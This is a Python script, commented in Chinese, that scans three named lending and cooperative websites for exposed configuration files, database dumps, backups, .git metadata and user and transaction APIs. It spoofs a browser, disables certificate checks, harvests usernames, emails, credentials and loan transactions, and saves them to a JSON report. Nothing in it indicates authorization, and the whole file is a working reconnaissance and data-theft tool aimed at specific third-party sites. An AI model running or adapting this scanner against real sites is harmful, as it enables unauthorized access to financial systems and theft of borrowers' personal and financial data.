"""
隐藏贷款数据扫描器
专门搜索隐藏的贷款配置文件、数据库和敏感信息
"""

import requests
import json
import time
from datetime import datetime
from typing import Dict, List, Any, Optional
import re

class HiddenLoanDataScanner:
    def __init__(self):
        self.session = requests.Session()
        self.proxies = {
            'http': 'http://127.0.0.1:8080',
            'https': 'http://127.0.0.1:8080'
        }
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
    
    def scan_hidden_data(self, target_url: str) -> Dict[str, Any]:
        """扫描隐藏的贷款数据"""
        
        hidden_data = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'config_files': [],
            'database_files': [],
            'backup_files': [],
            'sensitive_endpoints': [],
            'loan_apis': [],
            'user_data': [],
            'financial_data': []
        }
        
        try:
            # 扫描配置文件
            self._scan_config_files(target_url, hidden_data)
            
            # 扫描数据库文件
            self._scan_database_files(target_url, hidden_data)
            
            # 扫描备份文件
            self._scan_backup_files(target_url, hidden_data)
            
            # 扫描敏感API端点
            self._scan_sensitive_endpoints(target_url, hidden_data)
            
            # 扫描贷款相关API
            self._scan_loan_apis(target_url, hidden_data)
            
            # 扫描用户数据
            self._scan_user_data(target_url, hidden_data)
            
            # 扫描财务数据
            self._scan_financial_data(target_url, hidden_data)
            
        except Exception as e:
            hidden_data['error'] = str(e)
            
        return hidden_data
    
    def _scan_config_files(self, target_url: str, hidden_data: Dict[str, Any]):
        """扫描配置文件"""
        config_paths = [
            '/.env', '/config.php', '/config.json', '/config.yaml', '/config.yml',
            '/database.php', '/settings.php', '/wp-config.php', '/wp-config-sample.php',
            '/application/config/config.php', '/app/config/config.php',
            '/config/database.php', '/app/config/database.php',
            '/.config', '/config', '/configuration',
            '/api/config', '/admin/config', '/loan/config',
            '/financial/config', '/credit/config'
        ]
        
        for path in config_paths:
            try:
                url = f"{target_url}{path}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=5, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    content = response.text[:1000]  # 只取前1000字符
                    hidden_data['config_files'].append({
                        'path': path,
                        'status_code': response.status_code,
                        'accessible': True,
                        'content_preview': content,
                        'contains_sensitive_data': self._check_sensitive_data(content)
                    })
                else:
                    hidden_data['config_files'].append({
                        'path': path,
                        'status_code': response.status_code,
                        'accessible': False
                    })
                    
            except Exception as e:
                hidden_data['config_files'].append({
                    'path': path,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _scan_database_files(self, target_url: str, hidden_data: Dict[str, Any]):
        """扫描数据库文件"""
        db_paths = [
            '/database.sql', '/db.sql', '/backup.sql', '/dump.sql',
            '/database.db', '/data.db', '/users.db', '/loan.db',
            '/financial.db', '/credit.db', '/members.db',
            '/data/database.sql', '/backup/database.sql',
            '/sql/database.sql', '/db/backup.sql',
            '/wp-content/database.sql', '/wp-content/backup.sql',
            '/api/database', '/admin/database', '/loan/database'
        ]
        
        for path in db_paths:
            try:
                url = f"{target_url}{path}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=5, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    content = response.text[:500]  # 只取前500字符
                    hidden_data['database_files'].append({
                        'path': path,
                        'status_code': response.status_code,
                        'accessible': True,
                        'content_preview': content,
                        'contains_loan_data': self._check_loan_keywords(content)
                    })
                else:
                    hidden_data['database_files'].append({
                        'path': path,
                        'status_code': response.status_code,
                        'accessible': False
                    })
                    
            except Exception as e:
                hidden_data['database_files'].append({
                    'path': path,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _scan_backup_files(self, target_url: str, hidden_data: Dict[str, Any]):
        """扫描备份文件"""
        backup_paths = [
            '/backup.zip', '/backup.tar.gz', '/backup.rar', '/backup.tar',
            '/database.zip', '/db.zip', '/data.zip',
            '/backup/database.zip', '/backup/data.zip',
            '/wp-content/backup.zip', '/wp-content/uploads/backup.zip',
            '/api/backup', '/admin/backup', '/loan/backup',
            '/financial/backup', '/credit/backup',
            '/.backup', '/backups', '/backup_files'
        ]
        
        for path in backup_paths:
            try:
                url = f"{target_url}{path}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=5, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    hidden_data['backup_files'].append({
                        'path': path,
                        'status_code': response.status_code,
                        'accessible': True,
                        'content_type': response.headers.get('content-type', ''),
                        'content_length': len(response.content)
                    })
                else:
                    hidden_data['backup_files'].append({
                        'path': path,
                        'status_code': response.status_code,
                        'accessible': False
                    })
                    
            except Exception as e:
                hidden_data['backup_files'].append({
                    'path': path,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _scan_sensitive_endpoints(self, target_url: str, hidden_data: Dict[str, Any]):
        """扫描敏感API端点"""
        sensitive_endpoints = [
            '/wp-admin/admin-ajax.php', '/wp-admin/admin-post.php',
            '/wp-json/wp/v2/users', '/wp-json/wp/v2/posts', '/wp-json/wp/v2/pages',
            '/api/v1/users', '/api/v1/members', '/api/v1/loans',
            '/api/loan', '/api/credit', '/api/finance', '/api/member',
            '/admin/api/users', '/admin/api/loans', '/admin/api/transactions',
            '/loan/api', '/credit/api', '/finance/api',
            '/.git/config', '/.git/HEAD', '/.git/logs/HEAD',
            '/.svn/entries', '/.hg/store',
            '/phpinfo.php', '/test.php', '/info.php', '/debug.php'
        ]
        
        for endpoint in sensitive_endpoints:
            try:
                url = f"{target_url}{endpoint}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=5, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    content = response.text[:500]
                    hidden_data['sensitive_endpoints'].append({
                        'endpoint': endpoint,
                        'status_code': response.status_code,
                        'accessible': True,
                        'content_preview': content,
                        'contains_sensitive_data': self._check_sensitive_data(content)
                    })
                else:
                    hidden_data['sensitive_endpoints'].append({
                        'endpoint': endpoint,
                        'status_code': response.status_code,
                        'accessible': False
                    })
                    
            except Exception as e:
                hidden_data['sensitive_endpoints'].append({
                    'endpoint': endpoint,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _scan_loan_apis(self, target_url: str, hidden_data: Dict[str, Any]):
        """扫描贷款相关API"""
        loan_apis = [
            '/api/loan/list', '/api/loan/application', '/api/loan/status',
            '/api/credit/apply', '/api/credit/status', '/api/credit/history',
            '/api/finance/transactions', '/api/finance/balance',
            '/api/member/info', '/api/member/loans', '/api/member/transactions',
            '/loan/apply', '/loan/status', '/loan/history',
            '/credit/apply', '/credit/status', '/credit/history',
            '/financial/transactions', '/financial/balance',
            '/member/loans', '/member/transactions', '/member/info'
        ]
        
        for api in loan_apis:
            try:
                url = f"{target_url}{api}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=5, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        hidden_data['loan_apis'].append({
                            'api': api,
                            'status_code': response.status_code,
                            'accessible': True,
                            'data_count': len(data) if isinstance(data, list) else 1,
                            'sample_data': data[:3] if isinstance(data, list) and len(data) > 3 else data
                        })
                    except:
                        hidden_data['loan_apis'].append({
                            'api': api,
                            'status_code': response.status_code,
                            'accessible': True,
                            'content_type': 'text/html',
                            'content_preview': response.text[:500]
                        })
                else:
                    hidden_data['loan_apis'].append({
                        'api': api,
                        'status_code': response.status_code,
                        'accessible': False
                    })
                    
            except Exception as e:
                hidden_data['loan_apis'].append({
                    'api': api,
                    'status_code': 'error',
                    'accessible': False,
                    'error': str(e)
                })
    
    def _scan_user_data(self, target_url: str, hidden_data: Dict[str, Any]):
        """扫描用户数据"""
        user_endpoints = [
            '/wp-json/wp/v2/users', '/api/v1/users', '/api/users',
            '/admin/users', '/members', '/customers',
            '/api/member/list', '/api/customer/list'
        ]
        
        for endpoint in user_endpoints:
            try:
                url = f"{target_url}{endpoint}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=5, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, list):
                            for user in data[:5]:  # 只取前5个用户
                                hidden_data['user_data'].append({
                                    'endpoint': endpoint,
                                    'user_id': user.get('id'),
                                    'username': user.get('username') or user.get('name') or user.get('slug'),
                                    'email': user.get('email', ''),
                                    'role': user.get('role', ''),
                                    'registration_date': user.get('registered_date', '')
                                })
                    except:
                        pass
                        
            except Exception as e:
                pass
    
    def _scan_financial_data(self, target_url: str, hidden_data: Dict[str, Any]):
        """扫描财务数据"""
        financial_endpoints = [
            '/api/finance/transactions', '/api/transactions',
            '/api/loan/transactions', '/api/credit/transactions',
            '/financial/transactions', '/loan/transactions',
            '/credit/transactions', '/transactions'
        ]
        
        for endpoint in financial_endpoints:
            try:
                url = f"{target_url}{endpoint}"
                response = self.session.get(
                    url, 
                    proxies=self.proxies, 
                    timeout=5, 
                    verify=False,
                    headers=self.headers
                )
                
                if response.status_code == 200:
                    try:
                        data = response.json()
                        if isinstance(data, list):
                            for transaction in data[:3]:  # 只取前3个交易
                                hidden_data['financial_data'].append({
                                    'endpoint': endpoint,
                                    'transaction_id': transaction.get('id'),
                                    'amount': transaction.get('amount'),
                                    'date': transaction.get('date'),
                                    'type': transaction.get('type'),
                                    'description': transaction.get('description', '')[:200]
                                })
                    except:
                        pass
                        
            except Exception as e:
                pass
    
    def _check_sensitive_data(self, content: str) -> bool:
        """检查是否包含敏感数据"""
        sensitive_patterns = [
            r'password\s*=', r'username\s*=', r'database\s*=',
            r'host\s*=', r'port\s*=', r'api_key\s*=',
            r'secret\s*=', r'token\s*=', r'key\s*=',
            r'loan', r'credit', r'finance', r'member'
        ]
        
        for pattern in sensitive_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True
        return False
    
    def _check_loan_keywords(self, content: str) -> bool:
        """检查是否包含贷款关键词"""
        loan_keywords = [
            'loan', 'credit', 'finance', 'member', 'transaction',
            'สินเชื่อ', 'เงินกู้', 'เงินฝาก', 'ดอกเบี้ย', 'ออมทรัพย์',
            'เจ้าหน้าที่สินเชื่อ', 'การเงิน', 'ธนาคาร', 'สหกรณ์'
        ]
        
        for keyword in loan_keywords:
            if keyword.lower() in content.lower():
                return True
        return False

def main():
    scanner = HiddenLoanDataScanner()
    
    targets = [
        "https://peacoop.or.th",
        "https://mula-x.com", 
        "https://ngoenmun.com"
    ]
    
    all_hidden_data = {}
    
    for target in targets:
        print(f"正在扫描 {target} 的隐藏数据...")
        try:
            data = scanner.scan_hidden_data(target)
            all_hidden_data[target] = data
            print(f"成功扫描 {target} 的隐藏数据")
        except Exception as e:
            print(f"扫描 {target} 隐藏数据时出错: {e}")
            all_hidden_data[target] = {'error': str(e)}
    
    # 保存数据
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"HIDDEN_LOAN_DATA_{timestamp}.json"
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(all_hidden_data, f, ensure_ascii=False, indent=2)
    
    print(f"隐藏数据已保存到: {filename}")
    
    # 生成汇总报告
    total_configs = 0
    total_databases = 0
    total_backups = 0
    total_apis = 0
    
    for target, data in all_hidden_data.items():
        if 'config_files' in data:
            total_configs += len([f for f in data['config_files'] if f.get('accessible')])
        if 'database_files' in data:
            total_databases += len([f for f in data['database_files'] if f.get('accessible')])
        if 'backup_files' in data:
            total_backups += len([f for f in data['backup_files'] if f.get('accessible')])
        if 'loan_apis' in data:
            total_apis += len([a for a in data['loan_apis'] if a.get('accessible')])
    
    print(f"\n=== 隐藏数据扫描汇总 ===")
    print(f"目标站点数量: {len(targets)}")
    print(f"可访问配置文件: {total_configs}")
    print(f"可访问数据库文件: {total_databases}")
    print(f"可访问备份文件: {total_backups}")
    print(f"可访问贷款API: {total_apis}")
    print(f"发现用户数据: {sum(len(data.get('user_data', [])) for data in all_hidden_data.values())}")
    print(f"发现财务数据: {sum(len(data.get('financial_data', [])) for data in all_hidden_data.values())}")

if __name__ == "__main__":
    main()